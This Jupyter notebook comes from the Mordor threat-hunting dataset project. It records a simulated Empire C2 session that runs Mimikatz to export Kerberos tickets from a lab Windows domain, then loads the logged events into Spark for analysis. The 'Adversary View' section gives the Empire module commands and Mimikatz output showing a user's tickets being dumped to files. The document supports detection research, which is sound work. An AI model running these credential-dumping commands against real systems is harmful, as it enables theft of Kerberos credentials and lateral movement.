{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Extract Tickets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518230752 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract kerberos tickets from memory in base64-encoded form."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: TKV35P8X) > usemodule credentials/mimikatz/extract_tickets\n",
    "(Empire: powershell/credentials/mimikatz/extract_tickets) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz extract kerberos tickets.\n",
    "            Module: powershell/credentials/mimikatz/extract_tickets\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract\n",
    "  kerberos tickets from memory in base64-encoded form.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        TKV35P8X                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/extract_tickets) > execute\n",
    "[*] Tasked TKV35P8X to run TASK_CMD_JOB\n",
    "[*] Agent TKV35P8X tasked with task ID 39\n",
    "[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/extract_tickets\n",
    "(Empire: powershell/credentials/mimikatz/extract_tickets) > Job started: YG28AV\n",
    "Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787\n",
    "\n",
    "  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # standard::base64\n",
    "isBase64InterceptInput  is false\n",
    "isBase64InterceptOutput is false\n",
    "\n",
    "mimikatz(powershell) # kerberos::list /export\n",
    "\n",
    "[00000000] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; \n",
    "  * Saved to file     : 0-60a10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi\n",
    "\n",
    "[00000001] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; \n",
    "  * Saved to file     : 1-40e10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi\n",
    "\n",
    "[00000002] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : cifs/HFDC01.shire.com @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n",
    "  * Saved to file     : 2-40a50000-nmartha@cifs~HFDC01.shire.com-SHIRE.COM.kirbi\n",
    "\n",
    "[00000003] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 6:54:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : ldap/HFDC01.shire.com/shire.com @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n",
    "  * Saved to file     : 3-40a50000-nmartha@ldap~HFDC01.shire.com~shire.com-SHIRE.COM.kirbi\n",
    "\n",
    "[00000004] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 6:32:04 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : HOST/HFDC01 @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n",
    "  * Saved to file     : 4-40a50000-nmartha@HOST~HFDC01-SHIRE.COM.kirbi\n",
    "\n",
    "[00000005] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 6:23:48 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : cifs/IT001 @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; \n",
    "  * Saved to file     : 5-40a10000-nmartha@cifs~IT001-SHIRE.COM.kirbi\n",
    "\n",
    "[00000006] - 0x00000012 - aes256_hmac      \n",
    "  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM\n",
    "  Server Name       : ldap/HFDC01.shire.com @ SHIRE.COM\n",
    "  Client Name       : nmartha @ SHIRE.COM\n",
    "  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n",
    "  * Saved to file     : 6-40a50000-nmartha@ldap~HFDC01.shire.com-SHIRE.COM.kirbi\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/extract_tickets) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
